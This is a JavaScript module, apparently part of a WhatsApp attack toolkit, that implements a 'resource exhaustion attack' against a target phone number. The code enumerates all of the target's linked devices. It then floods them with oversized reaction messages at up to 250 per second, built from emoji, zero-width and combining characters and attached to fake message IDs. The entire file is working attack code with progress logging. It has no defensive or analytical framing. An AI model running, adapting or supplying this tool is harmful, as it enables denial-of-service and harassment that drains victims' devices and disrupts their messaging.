import { connectToWhatsApp } from '../lib/client.js';
import { jidNormalizedUser } from '@whiskeysockets/baileys';
import chalk from 'chalk';
import { checkAuth, sleep } from '../lib/utils.js';
import ora from 'ora';
import fs from 'fs';
import path from 'path';

// Aggression mode configurations
const MODES = {
    aggressive: {
        payloadSize: 1000,
        rate: 250,          // reactions per second
        delayMs: 4          // delay between sends
    },
    slow: {
        payloadSize: 500,
        rate: 10,
        delayMs: 100
    }
};

export async function exhaust(number, options) {
    checkAuth();
    
    const mode = options.aggression === 'slow' ? 'slow' : 'aggressive';
    const config = MODES[mode];
    const duration = parseInt(options.duration, 10) || 60;

    console.log(chalk.red.bold('\n⚠️  RESOURCE EXHAUSTION ATTACK'));
    console.log(chalk.dim('─'.repeat(50)));
    console.log(chalk.yellow(`Target: ${number}`));
    console.log(chalk.yellow(`Mode: ${mode}`));
    console.log(chalk.yellow(`Duration: ${duration}s`));
    console.log(chalk.yellow(`Payload: ${config.payloadSize} chars @ ${config.rate}/sec`));
    console.log(chalk.dim('─'.repeat(50)));
    console.log(chalk.red('Press Ctrl+C to stop\n'));

    try {
        const connectSpinner = ora('Connecting to WhatsApp...').start();
        const sock = await connectToWhatsApp();

        await new Promise(resolve => {
            if (sock.ws.isOpen) return resolve();
            sock.ev.on('connection.update', (u) => {
                if (u.connection === 'open') resolve();
            });
        });
        connectSpinner.succeed('Connected to WhatsApp');

        // Enumerate devices
        const deviceSpinner = ora('Enumerating target devices...').start();
        const rawJid = jidNormalizedUser(`${number}@s.whatsapp.net`);
        const [exists] = await sock.onWhatsApp(rawJid);
        const targetJid = exists?.exists ? exists.jid : rawJid;
        const devices = await sock.getUSyncDevices([targetJid], false, false);
        deviceSpinner.succeed(`Found ${devices.length} device(s) - all will receive payloads`);

        console.log(chalk.cyan('\nStarting attack...\n'));

        // Attack stats
        const startTime = Date.now();
        const endTime = startTime + (duration * 1000);
        let sentCount = 0;
        let errorCount = 0;
        let lastReportTime = startTime;

        // Handle Ctrl+C gracefully
        let running = true;
        process.on('SIGINT', () => {
            running = false;
            console.log(chalk.yellow('\n\nStopping attack...'));
        });

        // Attack loop
        while (running && Date.now() < endTime) {
            try {
                await sendOversizedReaction(sock, targetJid, config.payloadSize);
                sentCount++;
            } catch (err) {
                errorCount++;
            }

            // Report every 5 seconds
            const now = Date.now();
            if (now - lastReportTime > 5000) {
                const elapsed = (now - startTime) / 1000;
                const rate = sentCount / elapsed;
                const dataMB = (sentCount * config.payloadSize) / (1024 * 1024);
                
                console.log(
                    chalk.cyan(`[${elapsed.toFixed(0)}s]`) + 
                    ` Sent: ${chalk.green(sentCount)} | ` +
                    `Rate: ${chalk.yellow(rate.toFixed(1))}/s | ` +
                    `Data: ${chalk.magenta(dataMB.toFixed(2))} MB | ` +
                    `Errors: ${chalk.red(errorCount)}`
                );
                lastReportTime = now;
            }

            // Delay between sends
            await sleep(config.delayMs);
        }

        // Final report
        const totalTime = (Date.now() - startTime) / 1000;
        const avgRate = sentCount / totalTime;
        const totalDataMB = (sentCount * config.payloadSize) / (1024 * 1024);

        console.log(chalk.dim('\n' + '═'.repeat(50)));
        console.log(chalk.white.bold('Attack Summary'));
        console.log(chalk.dim('═'.repeat(50)));
        console.log(`Duration: ${totalTime.toFixed(1)}s`);
        console.log(`Reactions sent: ${sentCount}`);
        console.log(`Average rate: ${avgRate.toFixed(1)}/s`);
        console.log(`Total data: ${totalDataMB.toFixed(2)} MB`);
        console.log(`Errors: ${errorCount}`);
        console.log(`Success rate: ${((sentCount / (sentCount + errorCount)) * 100).toFixed(1)}%`);

        // Save log if output specified
        if (options.output) {
            if (!fs.existsSync(options.output)) fs.mkdirSync(options.output, { recursive: true });
            const logPath = path.join(options.output, `exhaust-${number}-${Date.now()}.json`);
            fs.writeFileSync(logPath, JSON.stringify({
                target: number,
                mode,
                duration: totalTime,
                sent: sentCount,
                errors: errorCount,
                avgRate,
                totalDataMB,
                timestamp: new Date().toISOString()
            }, null, 2));
            console.log(chalk.cyan(`\nLog saved to: ${logPath}`));
        }

        process.exit(0);

    } catch (error) {
        console.error(chalk.red('Error:'), error);
        process.exit(1);
    }
}

/**
 * Send an oversized reaction payload to exhaust resources
 */
async function sendOversizedReaction(sock, targetJid, payloadSize) {
    const fakeId = 'DOS_' + Date.now() + '_' + Math.random().toString(36).substring(7);
    const fakeKey = {
        remoteJid: targetJid,
        fromMe: true,
        id: fakeId
    };

    const payload = generatePayload(payloadSize);

    await Promise.race([
        sock.sendMessage(targetJid, {
            react: {
                text: payload,
                key: fakeKey
            }
        }),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
    ]);
}

/**
 * Generate oversized payload with unicode characters
 */
function generatePayload(size) {
    const patterns = [
        () => String.fromCharCode(0x1F600 + (Math.random() * 80 | 0)), // Emojis
        () => '\u200B\u200C\u200D\uFEFF', // Zero-width chars
        () => String.fromCharCode(0x0300 + (Math.random() * 112 | 0)), // Diacriticals
    ];

    let payload = '';
    while (payload.length < size) {
        const pattern = patterns[Math.floor(Math.random() * patterns.length)];
        payload += pattern();
    }
    return payload.substring(0, size);
}

